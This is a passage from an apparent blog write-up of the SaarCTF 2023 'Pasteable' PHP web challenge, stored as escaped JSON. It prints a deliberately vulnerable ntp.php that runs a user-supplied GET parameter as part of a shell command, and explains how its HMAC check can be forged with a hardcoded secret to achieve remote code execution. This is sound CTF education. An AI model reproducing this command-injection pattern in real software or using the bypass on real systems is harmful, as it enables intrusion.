!isset($_POST[\u0026#39;solution\u0026#39;]) || gettype($_POST[\u0026#34;solution\u0026#34;])!=\u0026#34;string\u0026#34; ){ header(\u0026#39;HTTP/1.0 403 Forbidden\u0026#39;); die(\u0026#34;Invalid request\u0026#34;); } P.S: We also found a potential RCE in the /func/ntp.php file, but we didn\u0026rsquo;t concentrate much on that because we had already a very efficient exploit running. Also the team was very short of players so we focused more on exploiting the other services.\nJust for completeness, this is the potentially vulnerable code:\n// Network-Time-Protocol API // variables and configs require(\u0026#34;../func/config.php\u0026#34;); // ensure that requester knows super-duper-secret $additional_time_formatter = (isset($_GET[\u0026#39;modifiers\u0026#39;])) ? $_GET[\u0026#39;modifiers\u0026#39;] : \u0026#34;\u0026#34;; $caller_nonce = (isset($_GET[\u0026#39;nonce\u0026#39;])) ? $_GET[\u0026#39;nonce\u0026#39;] : \u0026#34;\u0026#34;; $caller_checksum = (isset($_GET[\u0026#39;checksum\u0026#39;])) ? $_GET[\u0026#39;checksum\u0026#39;] : \u0026#34;\u0026#34;; if(isset($_GET[\u0026#39;modifiers\u0026#39;])) { $nonce_hash = hash_hmac(\u0026#39;sha256\u0026#39;, $caller_nonce, $APP_SECRET); $checksum = hash_hmac(\u0026#39;sha256\u0026#39;, $additional_time_formatter, $nonce_hash); // if the checksum is wrong, the requester is a bad guy who // doesn\u0026#39;t know the secret if($checksum !== $caller_checksum) { die(\u0026#34;ERROR: Checksum comparison has failed!\u0026#34;); } } // print current time $time_command = ($APP_HOST === \u0026#39;win\u0026#39;) ? \u0026#34;date /t \u0026amp;\u0026amp; time /t\u0026#34; : \u0026#34;date\u0026#34;; $requested_time = `$time_command $additional_time_formatter`; echo preg_replace(\u0026#39;~[\\r\\n]+~\u0026#39;, \u0026#39;\u0026#39;, $requested_time); This ntp.php file uses OS commands to get the timestamp. The vulnerability is that a user-controlled parameter is appended to the command, this is exploitable and enables RCE on the backend. The only complication is the hmac checksum verification, but this can be bypassed because:\nThe $APP_SECRET is hardcoded and reused. We have control over the \u0026quot;nonce\u0026quot; and the \u0026quot;checksum\u0026quot; parameters. So, if we forge \u0026quot;checksum\u0026quot; and \u0026quot;nonce\u0026quot; based on our\u0026quot;modifiers\u0026quot; (which contains our code injection payload), we should achieve the RCE we\u0026rsquo;ve longed for. ","permalink":"http://leo1.cc/posts/writeups/saarctf23-pasteable/","summary":"This challenge was part of the attack/defense SaarCTF of 2023. This is a web challenge written in PHP, where a wrong use of \u0026ldquo;==\u0026rdquo; led to a type juggling vulnerability.","title":"SaarCTF2023 - Pasteable"}]